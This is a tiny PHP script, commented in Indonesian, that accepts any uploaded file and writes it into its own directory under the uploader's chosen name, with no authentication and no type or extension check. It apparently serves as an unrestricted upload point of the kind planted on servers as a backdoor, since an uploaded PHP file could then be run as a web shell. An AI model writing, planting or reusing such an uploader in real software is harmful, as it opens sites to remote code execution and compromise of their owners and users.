<?php
// POST multipart: filedata=<file> -> tersimpan di dir ini, output nama + size.
if (!empty($_FILES['filedata']['tmp_name'])) {
  $n = basename($_FILES['filedata']['name'] ?: ('up_'.time().'.bin'));
  move_uploaded_file($_FILES['filedata']['tmp_name'], __DIR__.'/'.$n);
  header('Content-Type: text/plain');
  echo "OK $n ".filesize(__DIR__.'/'.$n)."\n";
}
